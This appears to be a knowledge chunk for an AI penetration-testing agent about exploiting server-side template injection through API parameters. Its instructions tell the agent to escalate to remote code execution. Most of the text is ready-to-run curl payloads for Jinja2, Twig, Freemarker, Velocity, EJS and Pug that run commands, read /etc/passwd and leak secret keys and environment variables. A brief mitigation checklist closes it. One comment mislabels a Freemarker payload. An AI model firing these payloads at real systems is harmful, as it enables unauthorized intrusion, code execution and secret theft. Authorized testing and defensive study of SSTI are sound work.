# SSTI & Expression Injection via API Parameters — Agent Chunk 87a
> Source: OWASP SSTI guidance, template engine documentation, PortSwigger SSTI research, CVE databases
> Purpose: Teaches the agent to detect and exploit Server-Side Template Injection through API JSON parameters that flow into template rendering engines
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing API endpoints that accept user input which may be rendered in templates (emails, PDFs, reports, notifications, dashboards). SSTI is commonly missed by API scanners because they test for SQLi and XSS patterns but not template syntax. Start with detection polyglots, then identify the engine, then escalate to RCE.

---

## 1. Why API Scanners Miss SSTI

```
Traditional API scanners test for:
  - SQL injection: ' OR 1=1 --
  - XSS: <script>alert(1)</script>
  - Command injection: ; id
  - Path traversal: ../../etc/passwd

They do NOT test for:
  - Jinja2: {{7*7}}
  - Twig: {{7*'7'}}
  - Freemarker: ${7*7}
  - Velocity: #set($x=7*7)$x
  - EJS: <%= 7*7 %>

SSTI through APIs is particularly dangerous because:
1. API inputs flow to backend template engines for email, PDF, report generation
2. Template engines often run with full server-side access
3. No client-side rendering = no browser security model protection
4. Successful SSTI typically leads directly to RCE
```

---

## 2. Detection Methodology

### Step 1: Identify Template-Rendered Outputs
```
Common API endpoints that render templates:
- /api/email/send         (email templates)
- /api/reports/generate   (PDF reports)
- /api/notifications/send (notification templates)
- /api/invoices/create    (invoice generation)
- /api/export/pdf         (export functionality)
- /api/user/profile       (customizable profile pages)
- /api/templates/preview  (template preview/test endpoints)
- /api/admin/settings     (customizable system messages)
```

### Step 2: Universal Detection Polyglot
```bash
# Send this polyglot that triggers responses across multiple engines
curl -X POST https://api.target.com/api/notifications/send \
  -H "Content-Type: application/json" \
  -d '{
    "recipient": "test@test.com",
    "subject": "Test",
    "body": "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}"
  }'

# Check the rendered output for "49" - indicates template evaluation
# If email/notification contains "49" anywhere, SSTI is confirmed
```

### Step 3: Engine Identification
```
Input: {{7*'7'}}

Results by engine:
- Jinja2 (Python):  7777777  (string multiplication)
- Twig (PHP):       49       (numeric multiplication)
- Nunjucks (JS):    7777777  (string multiplication)
- Freemarker:       Error    (different syntax needed)
- Velocity:         Error    (different syntax needed)

Input: ${7*7}
- Freemarker:       49
- Velocity:         49 (with #set)
- Thymeleaf:        49

Input: <%= 7*7 %>
- EJS (JS):         49
- ERB (Ruby):       49
```

---

## 3. Engine-Specific Payloads

### Jinja2 (Python — Flask, Django)

```bash
# Detection
curl -X POST https://api.target.com/api/email/send \
  -d '{"template_name":"welcome","name":"{{7*7}}"}'
# If name renders as "49": Jinja2 confirmed

# Configuration disclosure
curl -X POST https://api.target.com/api/email/send \
  -d '{"name":"{{config.items()}}"}'

# Read environment variables
curl -X POST https://api.target.com/api/email/send \
  -d '{"name":"{{request.environ}}"}'

# RCE via MRO chain
curl -X POST https://api.target.com/api/email/send \
  -H "Content-Type: application/json" \
  -d '{"name":"{{\"\".__class__.__mro__[1].__subclasses__()[396](\"id\",shell=True,stdout=-1).communicate()[0].decode()}}"}'

# RCE via lipsum (shorter payload)
curl -X POST https://api.target.com/api/email/send \
  -d '{"name":"{{lipsum.__globals__[\"os\"].popen(\"id\").read()}}"}'

# RCE via cycler
curl -X POST https://api.target.com/api/email/send \
  -d '{"name":"{{cycler.__init__.__globals__.os.popen(\"id\").read()}}"}'

# File read
curl -X POST https://api.target.com/api/email/send \
  -d '{"name":"{{\"\".__class__.__mro__[1].__subclasses__()[40](\"/etc/passwd\").read()}}"}'
```

### Twig (PHP — Symfony, Laravel)

```bash
# Detection
curl -X POST https://api.target.com/api/render \
  -d '{"content":"{{7*\"7\"}}"}'
# Twig returns: 49 (not 7777777 like Jinja2)

# System info
curl -X POST https://api.target.com/api/render \
  -d '{"content":"{{app.request.server.all|join(\",\")}}"}'

# RCE via filter
curl -X POST https://api.target.com/api/render \
  -d '{"content":"{{[\"id\"]|filter(\"system\")}}"}'

# RCE via map
curl -X POST https://api.target.com/api/render \
  -d '{"content":"{{[\"id\"]|map(\"passthru\")|join}}"}'

# File read
curl -X POST https://api.target.com/api/render \
  -d '{"content":"{{\"\/etc\/passwd\"|file_excerpt(1,-1)}}"}'
```

### Freemarker (Java — Spring, Struts)

```bash
# Detection
curl -X POST https://api.target.com/api/report/generate \
  -d '{"title":"${7*7}"}'
# Returns: 49

# RCE via Execute utility
curl -X POST https://api.target.com/api/report/generate \
  -H "Content-Type: application/json" \
  -d '{"title":"${\"freemarker.template.utility.Execute\"?new()(\"id\")}"}'

# RCE via ObjectConstructor
curl -X POST https://api.target.com/api/report/generate \
  -d '{"title":"${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.Runtime\").exec(\"id\")}"}'

# File read via JndiObjectFactory
curl -X POST https://api.target.com/api/report/generate \
  -d '{"title":"<#assign f=\"freemarker.template.utility.Execute\"?new()>${f(\"cat /etc/passwd\")}"}'
```

### Velocity (Java)

```bash
# Detection
curl -X POST https://api.target.com/api/template/render \
  -d '{"content":"#set($x=7*7)${x}"}'
# Returns: 49

# RCE
curl -X POST https://api.target.com/api/template/render \
  -H "Content-Type: application/json" \
  -d '{"content":"#set($x=\"\")#set($e=$x.class.forName(\"java.lang.Runtime\"))#set($rt=$e.getRuntime())#set($proc=$rt.exec(\"id\"))#set($isr=0)#foreach($b in [1..$proc.inputStream.available()])#set($isr=$proc.inputStream.read())$chr.toChars($isr)#end"}'

# Simpler RCE payload
curl -X POST https://api.target.com/api/template/render \
  -d '{"content":"#set($s=\"\")#set($stringClass=$s.class)#set($runtime=$stringClass.forName(\"java.lang.Runtime\").getRuntime())#set($process=$runtime.exec(\"id\"))$process"}'
```

### EJS (JavaScript — Express/Node.js)

```bash
# Detection
curl -X POST https://api.target.com/api/preview \
  -d '{"content":"<%= 7*7 %>"}'
# Returns: 49

# RCE
curl -X POST https://api.target.com/api/preview \
  -H "Content-Type: application/json" \
  -d '{"content":"<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'

# File read
curl -X POST https://api.target.com/api/preview \
  -d '{"content":"<%= require(\"fs\").readFileSync(\"/etc/passwd\",\"utf8\") %>"}'
```

### Pug (JavaScript — formerly Jade)

```bash
# Detection
curl -X POST https://api.target.com/api/render \
  -d '{"template":"= 7*7"}'
# Returns: 49

# RCE
curl -X POST https://api.target.com/api/render \
  -d '{"template":"- var x = global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()\n= x"}'
```

---

## 4. API-Specific SSTI Vectors

### JSON Parameter Injection
```json
{
  "user": {
    "name": "{{config.SECRET_KEY}}",
    "bio": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "location": "<%= process.env.DATABASE_URL %>"
  }
}
```

### Nested Object Traversal
```json
{
  "notification": {
    "template": "welcome",
    "variables": {
      "greeting": "Hello {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
    }
  }
}
```

### Header-Based Injection
```bash
# Some APIs use User-Agent or Referer in templates (logging, analytics)
curl -X GET https://api.target.com/api/data \
  -H "User-Agent: {{7*7}}" \
  -H "Referer: ${7*7}"
# Check error pages, logs, or analytics dashboards for rendered output
```

---

## 5. Mitigation Checklist
- Use logic-less template engines (Mustache, Handlebars) for user-controlled content
- Never pass user input directly into template rendering context
- Sandbox template engines: disable dangerous functions (exec, import, require)
- Jinja2: use `SandboxedEnvironment` instead of `Environment`
- Freemarker: set `new_builtin_class_resolver` to `SAFER_RESOLVER`
- Validate and sanitize template syntax characters in user input (`{{`, `${`, `<%`)
- Implement output encoding appropriate to the template context
- Separate data from template logic: pass user data as template variables, not inline
- Monitor for template error messages in API responses (leak engine identity)
